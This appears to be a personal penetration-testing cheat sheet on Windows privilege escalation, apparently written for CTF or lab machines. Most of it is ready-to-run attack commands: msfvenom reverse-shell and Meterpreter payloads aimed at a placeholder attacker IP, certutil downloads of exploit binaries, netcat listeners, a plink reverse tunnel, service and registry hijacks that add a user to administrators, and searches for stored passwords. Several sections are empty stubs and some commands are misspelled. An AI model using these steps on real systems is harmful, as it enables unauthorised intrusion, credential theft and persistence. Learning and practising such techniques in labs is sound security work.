# Windows

## Manual Enumeration

### System

```powershell
systeminfo  # host name, OS Name, OS version, etc…
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic [command]
```

### User

```powershell
whoami
whoami /priv
whoami /groups
whoami /all
net user  # show users that are on the machine
net user [user]  # get information about a specific user
net localgroup administrator  # get users that belong to the administrator group
```

### Network

```powershell
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
```

### Password Hunting

```powershell
findstr /si password *.txt *.ini *.config *xml  # searches from the directory for the word password in all the specified files
dir secret.doc /s /p  # searches recursively for a file called secret.doc
```

### A/V and Firewall Enumeration

```powershell
sc query windefend
sc queryex type= service
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

## Automated Enumeration

### Executables

* winPEAS
* seatbelt.exe
* Watson.exe
* SharpUp.exe

### PowerShell

* Sherlock.ps1
* PowerUp.ps1
* jaws-enum.ps1

### Other

* windows-exploit-suggester.py
* Exploit Suggester (Metasploit)

## Escalation Path Techniques

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Kernel Exploits

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

#### Metasploit

```bash
# From a Meterpreter shell
meterpreter > run post/multi/recon/local_exploit_suggester
# Ex: ms10_015 kitrap0d
msf > use exploit/windows/local/ms10_015_kitrap0d
```

#### Manual

```bash
# Foothold
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > manual.aspx
ftp <IP>  # Anonymous login
put manual.aspx
nc -lvnp 4444
http://<IP>/manual.aspx
# Exploit - after running windows-exploit-suggester
# Can Google for exploits already compiled
certutil -f http://<IP>/MS10-059.exe ms.exe  # From target
nc -lvnp 5555  # From Kali
ms.exe <Kali-IP> 5555  # From target
```

### Service Exploits

#### Binary Paths

```powershell
# Detection
powshell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
# Another way
accesschk64.exe -uwcv Everyone *
# In either case, look for 'CanRestart True' as the service will need to be restarted
accesschk64.exe -wuvc daclsvc  # Running against a found service
# Look for SERVICE_CHANGE_CONFIG

# Exploitation
sc qc daclsvc  # Identify binary path
sc config daclsvc binpath="net localgroup administrators user /add"
sc qc daclsvc
netlocalgroup administrators
sc start daclsvc 
netlocalgroup administrators
```

#### Unquoted Service Paths

```powershell
# Detection
powshell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
# Look for ServiceName where Path does not contain any quotes (and can restart)
sc qc unquotedsvc

# Exploitation
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
# Copy the generated file, common.exe, to the Windows VM.
# Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
# Open command prompt and type:
sc start unquotedsvc
```

### Registry Exploits

#### Autoruns

```powershell
# Detection
# Open command prompt and type:
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
#In Autoruns, click on the ‘Logon’ tab.
# From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
# In command prompt type: 
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
# From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.

powershell -ep bypass
. .\PowerIp.ps1
Invoke-AllChecks

# Exploitation
msfconsole
msf > use multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > run
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> -f exe -o program.exe
# Copy program.exe to the Windows target
# Place program.exe in ‘C:\Program Files\Autorun Program’.
# To simulate the privilege escalation effect, logoff and then log back on as an administrator user.
# In Kali, wait for a session to open in Metasploit
```

#### AlwaysInstallElevated

```powershell
# Detection
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
# From the output, notice that "AlwaysInstallElevated" value is 1
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
# From the output, notice that “AlwaysInstallElevated” value is 1.

# Exploitation
## From Kali
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [Kali VM IP Address]
run
# Open an additional command prompt and type:
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> -f msi -o setup.msi
# Copy the generated file, setup.msi, to the Windows VM.

## From Windows Target
# Place ‘setup.msi’ in ‘C:\Temp’.
# Open command prompt and type:
msiexec /quiet /qn /i C:\Temp\setup.msi
```

#### regsvc ACL

```powershell
# Detection
powershell -ep bypass
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.

# Exploitation
# Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.
# In Kali, open windows_service.c in a text editor and replace the command used by the system() function to:
cmd.exe /k net localgroup administrators user /add
x86_64-w64-mingw32-gcc windows_service.c -o x.exe  # NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64'
# Copy the generated file x.exe, to the Windows VM

# Place x.exe in ‘C:\Temp’.
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
sc start regsvc
net localgroup administrators
```

### Passwords

```powershell
# Search types of files for the word password
findstr /si password *.txt (*.xml, *.ini)
# Check for file shares only listening locally i.e. SMB (port forward)
netstat -ano  
# Searching registry
reg query HKLM /f password /t REG_SZ /s  # Look for plaintext passwords in output
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # find username and default passowrd
# Could be password reuse to test on Administrator or other account
```

#### Port Forward

```bash
# From Kali
# edit sshd_config, by uncommenting PermitRootLogin yes
service ssh restart
service ssh start
# From target
# Download Plink to the target
certutil -urlcache -f http://<IP>/plink.exe plink.exe
plink.exe -l root -pw <password> -R 445:127.0.0.1:445 <Kali-IP>
# Will be brought to root login within same shell
netstat -ano | grep 445  # Verify listening
winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
```

### Scheduled Tasks

### Insecure GUI Apps

### Startup Apps

```powershell
# Detection
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.

# Exploitation
Metasploit, use multi/handler, set payload windows/meterpreter/reverse_tcp, run
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o x.exe
# Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.
# Logoff and Login with admin account credentials
# Wait for session to be created in Metasploit
```

### Installed Apps

```
```

### Token Impersonation

```powershell
whoami /priv
meterpreter > getprivs
# Look for SeImpersonatePrivilege as Enabled
# Can use windows-exploit-suggester to find potato attacks
```

### Potato Attacks

```powershell
meterpreter > run post/multi/recon/local_exploit_suggester
msf use exploit windows/local/ms16_065_reflection
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
meterpreter > shell
```

#### Alternate Data Streams

```powershell
# Regular directory listing
dir
hm.txt
# Recursive directory listing identifying alternate data streams
dir /R
hm.txt
hm.txt:root.txt:$DATA
# Read alternate data stream
more < hm.txt:root.txt:$DATA
```

### Port Forwarding

```powershell
```

### WSL

Running Linux on top of Windows

```powershell
where /R c:\windows wsl.exe
/path/to/wsl.exe whoami
where /R c:\windows bash.exe
/path/to/bash.exe
whoami, hostname, uname -a
python -c "import pty;pty.spawn('/bin/bash')"  # Get a TTY shell
# General Linux enumeration (history, .bash_history, etc.)
# If credentials are found...
psexec.py
smbexec.py
wmiexec.py
```

### getsystem

```bash
meterpreter > getsystem
meterpreter > getsystem -h
```

### RunAs

```powershell
cmdkey /list  # Look for Current stored credentials
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"

```

### DLL Hijacking

```powershell
# Detection

# Exploitaion

```

### Executable Files

```powershell
# Detection
powershell -ep bypass
Invoke-AllChecks
# If we know where the service exists:
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
# Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.

# Exploitation
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
net localgroup administrators
```
